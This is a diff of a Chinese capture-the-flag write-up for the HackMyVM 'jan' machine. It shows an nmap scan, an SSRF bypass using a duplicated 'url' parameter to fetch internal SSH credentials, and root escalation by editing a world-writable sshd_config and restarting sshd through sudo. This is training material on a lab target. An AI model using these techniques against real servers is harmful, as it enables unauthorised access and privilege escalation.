@@ -1,15 +1,13 @@
-# hmv_jan
-
 # 0.简介
 
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=jan  
-**难度**：绿色  
-**目标 IP**：192.168.205.136  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=jan
+ 难度：绿色
+ 目标 IP：192.168.205.136
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -99,7 +97,6 @@ Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/                            
 Welcome to our Public Server. Maybe Internal.                                                                                                                                    
-
 ```
 
 进行目录爆破
@@ -148,7 +145,6 @@ Parameter 'url' needed.
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.136:8080/credz   
 Only accessible internally.                                                                                                                                    
-
 ```
 
 目前来看出题思路是通过/redirect访问/credz，进行尝试
@@ -166,7 +162,6 @@ HTTP/1.1 200 OK
 Date: Mon, 03 Feb 2025 04:47:07 GMT
 Content-Length: 27
 Content-Type: text/plain; charset=utf-8
-
 ```
 
 这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是
@@ -186,7 +181,6 @@ Content-Type: text/plain; charset=utf-8
 ┌──(kali㉿kali)-[~/test]
 └─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=/credz"            
 ssh/EazyLOL                                                                                                                                     
-
 ```
 
 登录
@@ -213,7 +207,6 @@ You may change this message by editing /etc/motd.
 
 jan:~$ id
 uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
-
 ```
 
 # 4.提权
@@ -234,7 +227,6 @@ Runas and Command-specific defaults for ssh:
 
 User ssh may run the following commands on jan:
     (root) NOPASSWD: /sbin/service sshd restart
-
 ```
 
 大概率是改ssh的配置文件了，看看有没有权限
@@ -242,7 +234,6 @@ User ssh may run the following commands on jan:
 ```
 jan:~$ ls -al /etc/ssh/sshd_config
 -rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
-
 ```
 
 有权限，那我们生成一个密钥，通过密钥登录root就好了
@@ -282,10 +273,9 @@ drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
 -rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys
 
 jan:~$ vi /etc/ssh/sshd_config
-
 ```
 
-![image](assets/image-20250203130052-vivh1m9.png)
+![image-20250331191252272](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191252331.png)
 
 ```
 jan:~$ sudo /sbin/service sshd restart
@@ -294,17 +284,15 @@ jan:~$ sudo /sbin/service sshd restart
 jan:~$ ssh root@127.0.0.1
 /etc/ssh/ssh_config: line 23: Bad configuration option: banner
 /etc/ssh/ssh_config: terminating, 1 bad configuration options
-
 ```
 
 banner应该也能提权，但是我不管它了
 
 ```
 jan:~$ vi /etc/ssh/ssh_config
-
 ```
 
-![image](assets/image-20250203130244-g8wjwy0.png)
+![image-20250331191302680](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191302731.png)
 
 ```
 jan:~$ ssh root@127.0.0.1
@@ -325,13 +313,14 @@ You may change this message by editing /etc/motd.
 
 jan:~# id
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-
 ```
 
 # 5.第二种方法
 
-![image](assets/image-20250203130435-bivb421.png)
+![image-20250331191312627](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191312690.png)
 
 🔗https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83
 
 这个方法我没试过，自己尝试一下吧
+
+<!-- ##{"timestamp":1738580133}## -->
